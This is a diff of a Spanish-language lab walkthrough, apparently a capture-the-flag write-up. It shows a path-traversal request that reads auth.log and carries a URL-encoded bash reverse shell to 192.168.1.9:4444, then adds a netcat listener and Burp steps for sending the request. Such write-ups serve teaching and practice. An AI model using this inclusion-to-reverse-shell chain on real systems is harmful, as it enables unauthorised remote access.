@@ -112,3 +112,12 @@ Antes de obtener un reverse shell, es preciso codificar los comandos extras. Con
 antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log&cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%39%2f%34%34%34%34%20%30%3e%26%31%27
 ```
 ![14](https://user-images.githubusercontent.com/75953873/175165089-399a559f-9aa8-46d8-a638-c03704825c1f.png)
+
+Después, ponemos a netcat en escucha por el puerto 4444 para obtener una reverse shell:
+```
+nc -lvnp 4444
+```
+Seleccionar la URL completa desde el proxy de Burp y hacer clic en **Forward** para enviar la petición GET maliciosa:
+
+![15](https://user-images.githubusercontent.com/75953873/175165583-a851e458-fda4-45c4-a019-d66d6b688cde.png)
+
